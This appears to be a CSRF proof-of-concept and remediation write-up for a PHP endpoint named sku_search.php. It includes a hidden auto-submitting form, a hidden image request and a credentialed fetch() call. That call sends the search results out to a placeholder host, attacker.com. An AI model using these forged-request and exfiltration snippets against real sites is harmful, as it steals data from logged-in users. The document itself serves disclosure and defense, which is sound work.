CSRF Attack POC - sku_search.php

⚠️ CSRF Vulnerability Demonstration

This page demonstrates how an attacker can perform CSRF attacks on the sku_search.php endpoint.

Vulnerability Details:

  • Endpoint: sku_search.php
  • Method: POST
  • Issue: Missing CSRF token validation
  • Impact: Attacker can perform searches on behalf of authenticated users

Attack Method 1: Form Submission (Hidden Form)

The following form would automatically submit when a logged-in user visits this page:

<form method="POST" action="http://target/app/sku_search.php">
    <input type="hidden" name="search" value="confidential_data">
</form>

The browser's session cookie is automatically included in the POST request, allowing the attacker's search to execute.

Attack Method 2: XMLHttpRequest/Fetch

Attacker could use JavaScript to silently perform the search:

fetch('http://target/app/sku_search.php', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'search=attacker_query'
}).then(r => r.text()).then(data => {
    // Exfiltrate search results to attacker server
    new Image().src = 'http://attacker.com/log?data=' + encodeURIComponent(data);
});

Attack Method 3: Image Tag (No JavaScript Required)

Even without JavaScript, an attacker could use a simple image tag:

<img src="http://target/app/sku_search.php?search=query" style="display:none;">

Note: This works with GET requests. For POST, forms or XHR are needed.

Why This is Vulnerable:

  • ✗ No CSRF token in the form
  • ✗ No CSRF token validation in the backend
  • ✗ No Referer/Origin header checking
  • ✗ No SameSite cookie attribute
  • ✗ No authorization checks (any authenticated user can search)
  • ✗ Relies solely on session cookie for authentication

Impact:

  • Reconnaissance: Attacker could perform searches to map the database
  • Privacy Violation: Sensitive search queries could be exposed
  • Information Gathering: Combined with IDOR, could leak confidential SKU data
  • Chaining: Could be combined with other vulnerabilities for greater impact
  • Audit Trail: Unauthorized searches would appear in user's history

Remediation:

  1. Implement CSRF tokens: Add token generation and validation 
    // In template: <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
// In PHP: if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) { die('CSRF'); }
  2. Use SameSite cookies: Set SameSite=Strict or SameSite=Lax 
    session_set_cookie_params(['samesite' => 'Strict']);
  3. Validate Origin/Referer: Check request origin 
    if ($_SERVER['HTTP_ORIGIN'] !== 'https://trusted-domain.com') { die(); }
  4. Use POST for state-changing operations: Avoid GET for mutations
  5. Implement proper authorization: Verify user permissions
